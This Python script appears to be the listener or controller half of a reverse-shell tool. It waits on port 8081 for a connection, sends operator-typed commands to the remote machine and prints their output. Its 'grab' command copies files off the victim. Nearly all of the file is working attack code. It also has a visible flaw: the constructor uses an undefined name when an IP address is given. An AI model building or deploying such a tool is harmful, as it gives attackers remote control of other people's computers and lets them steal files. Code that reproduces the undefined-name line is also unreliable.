from sys import platform
from socket import socket, AF_INET, SOCK_DGRAM
from typing import Optional, Tuple

PLATFORM_SEPARATOR_MAPPING = {
    'win32': '\\',
    'linux': '/',
}

EOF_FLAG = b'0x0F0E0D0C0B0A'


class SocketHandler:
    def __init__(
        self, port: int, ip_address: Optional[str] = None, max_connection: int = 1
    ):
        self.socket = socket()
        self.connection, self.dest_addr = self._configure_socket(
            listen_ip if ip_address else self._get_current_ip(), port, max_connection
        )
        print(f"[+] We got a connection {self.dest_addr}")

    def __del__(self):
        self.terminate_connection()

    def _configure_socket(
        self, listen_ip: str, port: int, max_connection: int
    ):
        self.socket.bind((listen_ip, port))
        self.socket.listen(max_connection)
        print(f"Listening to {listen_ip}:{port} for {max_connection} connection(s)")

        return self.socket.accept()

    def _get_current_ip(self) -> str:
        with socket(AF_INET, SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]

    def send_command(self, command: str):
        self.connection.send(command.encode())

    def print_result(self):
        print(f"{self.connection.recv(1024).decode()}")

    def terminate_connection(self):
        self.socket.close()
        print("Bye!")

    def receive_file(self, filename):
        with open(filename, 'wb') as f:
            while bits := self.connection.recv(1024):
                if EOF_FLAG in bits:
                    f.write(bits[:-len(EOF_FLAG)])
                    print(f"[+] File Transfered: {filename}")
                    break
                f.write(bits)


def parse_input():
   pass 


def main():
    socket_handler = SocketHandler(port=8081)

    while True:
        user_input = input("Shell > ")
        if "terminate" in user_input:
            socket_handler.terminate_connection()
            break
        elif "grab" in user_input:
            socket_handler.send_command(command=user_input)

            grab, path = user_input.split(':')
            filename = path.split(PLATFORM_SEPARATOR_MAPPING.get(platform, '/'))[-1]
            socket_handler.receive_file(filename)
        else:
            socket_handler.send_command(command=user_input)
            socket_handler.print_result()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit(0)
